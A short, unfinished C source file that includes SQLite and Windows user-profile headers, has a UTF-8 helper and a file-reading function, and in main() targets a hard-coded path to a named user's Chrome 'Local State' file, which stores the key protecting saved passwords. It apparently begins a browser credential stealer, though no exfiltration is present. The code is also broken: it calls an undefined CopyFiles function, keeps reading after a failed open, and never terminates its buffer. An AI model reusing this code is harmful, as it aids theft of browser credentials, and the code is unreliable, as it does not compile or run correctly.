
#include "sqlite3.h"
#include <windows.h>
#include <stdio.h>
#include <userenv.h>

//src = https://stackoverflow.com/questions/21737906/how-to-read-write-utf8-text-files-in-c
/* The first byte of a UTF-8 character
 * indicates how many bytes are in
 * the character, so only check that
 */
int numberOfBytesInChar(unsigned char val) {
    if (val < 128) {
        return 1;
    } else if (val < 224) {
        return 2;
    } else if (val < 240) {
        return 3;
    } else {
        return 4;
    }
}


char * readFile(char * fileName){
        DWORD fileSize;
        char* buffer;
        fflush(stdin);
        FILE * infile = fopen(fileName, "r");
        if (infile == NULL){
        printf("file failed to open");
        printf("ERROR: %d", GetLastError());
    }
    long size;
    fseek(infile, 0L, SEEK_END);
    size = ftell(infile);
    fseek(infile, 0L, SEEK_SET);
    printf("SIZE inside readFile: %d\n", size);
    buffer = (char *)malloc(size);
    char character;
    int i = 0;
    
    while((character=fgetc(infile))!=EOF){
        buffer[i] = character;
        printf("%c",buffer[i]);
        i++;

    }
    return buffer;
    
}



int main(){
    char * p = "C:\\Users\\Wyatt2\\AppData\\Local\\Google\\Chrome\\User Data\\Local State";
    CopyFiles("a.txt",p);
   
    
}
